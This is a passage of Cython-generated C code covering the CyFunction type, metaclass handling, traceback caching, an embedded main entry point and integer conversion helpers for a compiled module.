    Py_CLEAR(m->func_annotations);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    PyObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(m->func.m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(m->func_classobj);
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject *__Pyx_CyFunction_descr_get(PyObject *func, PyObject *obj, PyObject *type)
{
#if PY_MAJOR_VERSION < 3
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {
        Py_INCREF(func);
        return func;
    }
    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {
        if (type == NULL)
            type = (PyObject *)(Py_TYPE(obj));
        return __Pyx_PyMethod_New(func, type, (PyObject *)(Py_TYPE(type)));
    }
    if (obj == Py_None)
        obj = NULL;
#endif
    return __Pyx_PyMethod_New(func, obj, type);
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
                #else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags in "
                        "__Pyx_CyFunction_Call. METH_OLDARGS is no "
                        "longer supported!");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
#if PY_MAJOR_VERSION > 2
            PyErr_Format(PyExc_TypeError,
                         "unbound method %.200S() needs an argument",
                         cyfunc->func_qualname);
#else
            PyErr_SetString(PyExc_TypeError,
                            "unbound method needs an argument");
#endif
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
    0,
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_CyFunction_descr_get,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_CyFunction_init(void) {
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}

/* CythonFunction */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}

/* CalculateMetaclass */
static PyObject *__Pyx_CalculateMetaclass(PyTypeObject *metaclass, PyObject *bases) {
    Py_ssize_t i, nbases = PyTuple_GET_SIZE(bases);
    for (i=0; i < nbases; i++) {
        PyTypeObject *tmptype;
        PyObject *tmp = PyTuple_GET_ITEM(bases, i);
        tmptype = Py_TYPE(tmp);
#if PY_MAJOR_VERSION < 3
        if (tmptype == &PyClass_Type)
            continue;
#endif
        if (!metaclass) {
            metaclass = tmptype;
            continue;
        }
        if (PyType_IsSubtype(metaclass, tmptype))
            continue;
        if (PyType_IsSubtype(tmptype, metaclass)) {
            metaclass = tmptype;
            continue;
        }
        PyErr_SetString(PyExc_TypeError,
                        "metaclass conflict: "
                        "the metaclass of a derived class "
                        "must be a (non-strict) subclass "
                        "of the metaclasses of all its bases");
        return NULL;
    }
    if (!metaclass) {
#if PY_MAJOR_VERSION < 3
        metaclass = &PyClass_Type;
#else
        metaclass = &PyType_Type;
#endif
    }
    Py_INCREF((PyObject*) metaclass);
    return (PyObject*) metaclass;
}

/* Py3ClassCreate */
static PyObject *__Pyx_Py3MetaclassPrepare(PyObject *metaclass, PyObject *bases, PyObject *name,
                                           PyObject *qualname, PyObject *mkw, PyObject *modname, PyObject *doc) {
    PyObject *ns;
    if (metaclass) {
        PyObject *prep = __Pyx_PyObject_GetAttrStr(metaclass, __pyx_n_s_prepare);
        if (prep) {
            PyObject *pargs = PyTuple_Pack(2, name, bases);
            if (unlikely(!pargs)) {
                Py_DECREF(prep);
                return NULL;
            }
            ns = PyObject_Call(prep, pargs, mkw);
            Py_DECREF(prep);
            Py_DECREF(pargs);
        } else {
            if (unlikely(!PyErr_ExceptionMatches(PyExc_AttributeError)))
                return NULL;
            PyErr_Clear();
            ns = PyDict_New();
        }
    } else {
        ns = PyDict_New();
    }
    if (unlikely(!ns))
        return NULL;
    if (unlikely(PyObject_SetItem(ns, __pyx_n_s_module, modname) < 0)) goto bad;
    if (unlikely(PyObject_SetItem(ns, __pyx_n_s_qualname, qualname) < 0)) goto bad;
    if (unlikely(doc && PyObject_SetItem(ns, __pyx_n_s_doc, doc) < 0)) goto bad;
    return ns;
bad:
    Py_DECREF(ns);
    return NULL;
}
static PyObject *__Pyx_Py3ClassCreate(PyObject *metaclass, PyObject *name, PyObject *bases,
                                      PyObject *dict, PyObject *mkw,
                                      int calculate_metaclass, int allow_py2_metaclass) {
    PyObject *result, *margs;
    PyObject *owned_metaclass = NULL;
    if (allow_py2_metaclass) {
        owned_metaclass = PyObject_GetItem(dict, __pyx_n_s_metaclass);
        if (owned_metaclass) {
            metaclass = owned_metaclass;
        } else if (likely(PyErr_ExceptionMatches(PyExc_KeyError))) {
            PyErr_Clear();
        } else {
            return NULL;
        }
    }
    if (calculate_metaclass && (!metaclass || PyType_Check(metaclass))) {
        metaclass = __Pyx_CalculateMetaclass((PyTypeObject*) metaclass, bases);
        Py_XDECREF(owned_metaclass);
        if (unlikely(!metaclass))
            return NULL;
        owned_metaclass = metaclass;
    }
    margs = PyTuple_Pack(3, name, bases, dict);
    if (unlikely(!margs)) {
        result = NULL;
    } else {
        result = PyObject_Call(metaclass, margs, mkw);
        Py_DECREF(margs);
    }
    Py_XDECREF(owned_metaclass);
    return result;
}

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
